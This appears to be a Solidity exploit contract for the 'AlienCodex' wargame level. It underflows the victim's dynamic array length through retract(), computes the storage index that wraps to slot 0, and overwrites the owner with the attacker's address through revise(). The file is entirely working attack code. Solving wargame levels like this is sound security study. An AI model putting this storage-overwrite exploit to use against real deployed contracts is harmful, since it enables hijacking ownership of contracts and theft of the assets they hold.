// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import './AlienCodex.sol';

contract AttackAlienCodex{
    AlienCodex victim;

    constructor(AlienCodex _victim) public {
      victim = _victim;
    }

    function attack() external {
      victim.make_contact();

      // change the codex's length to 2^256, then we can access any slot of the contract. 
      victim.retract();

      // the codex is a dynamic array located in slot 1 of the contract
      // the actual data stored in the codex begins at the location keccak256(1)
      uint idx = (2**256-1) - uint(keccak256(abi.encode(1))) + 1;
      bytes32 content = bytes32(uint256(uint160(msg.sender)));
      
      victim.revise(idx, content);
    }
}